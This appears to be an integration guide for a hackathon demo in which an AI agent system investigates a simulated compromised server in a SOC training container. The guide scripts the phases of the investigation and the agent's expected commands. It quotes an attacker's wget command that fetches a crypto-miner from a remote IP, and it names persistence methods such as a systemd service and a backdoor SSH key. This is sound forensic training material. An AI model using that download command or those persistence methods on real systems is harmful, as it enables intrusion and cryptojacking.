# Proxi Multi-Desktop Forensic Investigation

## Integration Guide

This guide explains how to use the forensic investigation container with Proxi's multi-desktop agent system for realistic SOC training.

## Architecture

```
┌─────────────────────────────────────────────────────────┐
│ Proxi Core (FastAPI)                                    │
│ - Gemini 3 Flash AI Agent                               │
│ - Session management                                     │
│ - Multi-agent routing                                    │
└─────────────────────────────────────────────────────────┘
                          ↓
        ┌─────────────────┴─────────────────┐
        ↓                                   ↓
┌──────────────────────┐         ┌──────────────────────┐
│ Linux Container      │         │ Windows Desktop      │
│ (Forensic Analysis)  │         │ (OCI Console)        │
│                      │         │                      │
│ - Compromised server │         │ - Cloud firewall     │
│ - Malware artifacts  │         │ - Security lists     │
│ - System logs        │         │ - Visual analysis    │
│ - App logs (RCE)     │         │                      │
└──────────────────────┘         └──────────────────────┘
```

## Setup Instructions

### 1. Start Forensic Container

```bash
# Build the container (if not already built)
cd e:\data\proxi-ai\soc-forensics
docker build -t proxi-forensics:v1 .

# Run the container
docker run -d --name forensic-investigation proxi-forensics:v1

# Verify it's running
docker ps | grep forensic
```

### 2. Register Container with Proxi

Add to `backend/registry/workstations.json`:

```json
{
  "forensic-linux": {
    "id": "forensic-linux",
    "name": "Compromised Server (Forensics)",
    "description": "Production server under investigation - Dec 6 incident",
    "workstation_type": "container",
    "host": "172.17.0.2",
    "port": 8081,
    "capabilities": ["terminal", "filesystem", "network"],
    "is_default": false,
    "tags": ["forensics", "linux", "compromised"]
  }
}
```

**Note:** Get the container IP with:
```bash
docker inspect forensic-investigation | grep IPAddress
```

### 3. Verify Windows Workstation

Ensure your Windows agent is registered for OCI console access:

```json
{
  "windows-main": {
    "id": "windows-main",
    "name": "Windows Workstation (OCI Access)",
    "description": "Windows desktop with Oracle Cloud Console access",
    "workstation_type": "windows",
    "host": "localhost",
    "port": 8081,
    "capabilities": ["terminal", "browser", "vision"],
    "is_default": true,
    "tags": ["windows", "cloud-console"]
  }
}
```

## Investigation Workflow

### Phase 1: Initial Triage (Linux Container)

**Analyst:** "We have high CPU on production server. Start investigation."

**Expected Agent Actions:**
```bash
# Activate Linux agent
→ Activate forensic-linux workstation

# Check processes
→ top -bn1 | head -20
→ ps aux --sort=-%cpu | head -10

# Identify suspicious process
→ Found: python3 (PID 6) consuming 58% CPU
→ Command: /usr/local/bin/fake_miner.py

# Check network
→ netstat -antp
→ Found: Connection to 119.28.183.120:19999 (SYN_SENT)
→ Found: PostgreSQL on 127.0.0.1:5432
```

### Phase 2: Hypothesis Testing - SSH Brute Force

**Analyst:** "Check for SSH brute force attack"

**Expected Agent Actions:**
```bash
→ grep -i "failed password" /var/log/secure
→ grep -i "invalid user" /var/log/secure
→ last -20

# Result: Only 20 successful logins from 20.40.50.18
# Conclusion: No brute force detected
```

### Phase 3: Hypothesis Testing - Database Exploit

**Analyst:** "Could this be a database exploit?"

**Expected Agent Actions:**
```bash
→ netstat -tlnp | grep 5432
→ Result: PostgreSQL on 127.0.0.1:5432 (localhost only)

# Agent should ask to verify firewall rules
→ "PostgreSQL is on localhost. Need to verify external firewall."
→ "Please switch to Windows workstation to check OCI Security Lists"
```

### Phase 4: Cloud Firewall Verification (Windows Desktop)

**Analyst:** "Switch to Windows workstation"

**Expected Agent Actions:**
```bash
# Activate Windows agent
→ Activate windows-main workstation

# Option 1: Read static file
→ cat C:\Users\azureuser\OCI_FIREWALL_CONFIG.txt

# Option 2: Open OCI Console (if available)
→ open_target("https://cloud.oracle.com")
→ look_at_screen("Navigate to VCN security lists")
→ Vision analysis: "Port 5432 NOT in ingress rules"

# Conclusion
→ "Port 5432 is blocked at cloud firewall level"
→ "Database exploit ruled out"
→ "Switch back to Linux to check application logs"
```

### Phase 5: Root Cause Discovery (Back to Linux)

**Analyst:** "Switch back to Linux container and check application logs"

**Expected Agent Actions:**
```bash
# Activate Linux agent
→ Activate forensic-linux workstation

# Check application logs
→ cat /var/log/ideaforge-frontend.log
→ grep "Command failed" /var/log/ideaforge-frontend.log

# SMOKING GUN FOUND
→ "Error: Command failed: wget http://103.135.101.15/linux_aarch64"
→ "Timestamp: 2025-12-06 10:37:42"

# Correlate with file timestamps
→ ls -lt /home/opc/ideaforge/frontend/
→ "linux_aarch64 created: Dec 6 10:37"
→ "Timestamps match!"

# Conclusion
→ "Next.js Server Action RCE vulnerability exploited"
→ "Attacker downloaded crypto-miner via wget"
```

### Phase 6: Persistence Analysis

**Expected Agent Actions:**
```bash
# Check systemd services
→ systemctl list-units --type=service | grep -i apache
→ cat /etc/systemd/system/apaches-main.service

# Check watchdog script
→ cat /usr/local/sbin/apaches.sh

# Check backdoor
→ cat /root/.ssh/authorized_keys
→ "Unauthorized SSH key found"

# Summary
→ "Persistence via systemd service 'apaches-main'"
→ "Watchdog script ensures miner stays running"
→ "Backdoor SSH key installed for future access"
```

## Gemini Agent Prompting

### System Context

Add this to Gemini's investigation context:

```python
investigation_context = """
You are assisting a SOC analyst investigating a security incident.

METHODOLOGY:
1. Triage: Identify immediate threats (processes, network)
2. Hypothesis Testing: Test each theory systematically
   - SSH brute force? Check /var/log/secure
   - Database exploit? Check netstat + firewall rules
   - Web app vulnerability? Check application logs
3. Evidence Collection: Document timestamps and correlations
4. Root Cause: Find initial access vector
5. Persistence: Identify how attacker maintains access

AVAILABLE WORKSTATIONS:
- forensic-linux: Compromised production server (Linux container)
- windows-main: Windows desktop with OCI Cloud Console access

INVESTIGATION RULES:
- When you need to verify cloud firewall rules, ask analyst to switch to Windows
- Always correlate file timestamps with log entries
- Document all findings with evidence
- Preserve evidence (don't delete files unless instructed)

CURRENT SCENARIO:
- Alert: 100% CPU usage on production server
- Date: January 2026 (attack occurred December 6, 2025)
- Your goal: Identify attack vector and persistence mechanisms
"""
```

### Sample Prompts

**Initial Investigation:**
```
"We have a production server with 100% CPU usage. The application is slow but still running. Start the investigation."
```

**Guided Hypothesis Testing:**
```
"Check if this was an SSH brute force attack"
"Could this be a database exploit?"
"Check the application logs for any vulnerabilities"
```

**Multi-Desktop Switching:**
```
"Switch to Windows workstation to verify OCI firewall rules"
"Go back to the Linux container and check for malware files"
```

## Testing Checklist

### ✅ Container Verification
- [ ] Container running: `docker ps | grep forensic`
- [ ] Miner process active: `docker exec forensic-investigation ps aux`
- [ ] Network connections visible: `docker exec forensic-investigation netstat -antp`
- [ ] Logs present: `docker exec forensic-investigation cat /var/log/ideaforge-frontend.log`

### ✅ Proxi Integration
- [ ] Container registered in workstations.json
- [ ] Can activate Linux agent from Proxi UI
- [ ] Can execute commands in container
- [ ] Can switch between Linux and Windows agents

### ✅ Investigation Flow
- [ ] Agent identifies high CPU process
- [ ] Agent checks SSH logs (false lead)
- [ ] Agent checks database (false lead)
- [ ] Agent requests Windows switch for firewall check
- [ ] Agent finds RCE evidence in app logs
- [ ] Agent correlates timestamps
- [ ] Agent identifies persistence mechanisms

## Demo Script (2 Minutes)

```
[0:00] "Alert: Production server CPU at 100%"
      → Agent activates Linux container
      → ps aux shows python3 at 58% CPU

[0:20] "Check for SSH brute force"
      → Agent: grep /var/log/secure
      → "No brute force. Only 20 logins from trusted IP"

[0:35] "Could this be a database exploit?"
      → Agent: netstat shows DB on localhost
      → "Need to verify firewall. Switching to Windows..."

[0:50] **SWITCH TO WINDOWS**
      → Agent reads OCI_FIREWALL_CONFIG.txt
      → "Port 5432 blocked. DB exploit ruled out"

[1:05] **BACK TO LINUX**
      → "Check application logs"
      → Agent: cat /var/log/ideaforge-frontend.log

[1:20] "FOUND: wget http://103.135.101.15/linux_aarch64"
      → Agent correlates timestamp with file creation
      → "Next.js RCE vulnerability confirmed"

[1:40] "Check for persistence"
      → Agent finds systemd service
      → Agent finds backdoor SSH key

[2:00] **CONCLUSION**
      → "Root cause: Next.js Server Action RCE"
      → "Payload: Crypto-miner (linux_aarch64)"
      → "Persistence: systemd + SSH backdoor"
```

## Cleanup

```bash
# Stop and remove container
docker stop forensic-investigation
docker rm forensic-investigation

# Remove from workstations.json
# (Delete the forensic-linux entry)

# Restart Proxi if needed
docker compose restart proxi-core
```

## Troubleshooting

### Container Not Accessible
```bash
# Check container is running
docker ps | grep forensic

# Check container IP
docker inspect forensic-investigation | grep IPAddress

# Update workstations.json with correct IP
```

### Miner Process Not Running
```bash
# Check logs
docker logs forensic-investigation

# Restart container
docker restart forensic-investigation
```

### Agent Can't Execute Commands
```bash
# Verify Proxi agent can reach container
docker exec forensic-investigation echo "test"

# Check workstation registration
curl http://localhost:4000/api/workstations
```

## Advanced: Running as Proxi Agent

To run the container as a full Proxi agent with /health and /execute endpoints:

1. Install agent server in container
2. Expose port 8081
3. Set PROXI_AGENT_KEY environment variable
4. Register with Core via /api/workstations/register

See `docs/DEPLOYMENT.md` for full agent setup instructions.

---

**Ready for Hackathon Demo!** 🎯

This multi-desktop forensic investigation showcases Proxi's unique capability to work across Linux containers and Windows desktops - something browser-based AI tools cannot do.
